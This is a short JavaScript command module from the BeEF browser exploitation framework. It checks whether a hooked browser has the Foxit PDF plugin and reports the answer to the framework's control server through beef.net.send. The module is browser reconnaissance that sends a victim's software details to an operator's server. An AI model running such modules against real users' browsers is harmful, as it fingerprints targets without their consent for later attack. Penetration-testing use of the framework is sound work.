//
// Copyright (c) 2006-2025 Wade Alcorn - wade@bindshell.net
// Browser Exploitation Framework (BeEF) - https://beefproject.com
// See the file 'doc/COPYING' for copying permission
//

beef.execute(function() {

	var result = ( beef.browser.hasFoxit() )? "Yes" : "No";

	beef.net.send("<%= @command_url %>", <%= @command_id %>, "foxit="+result);

});

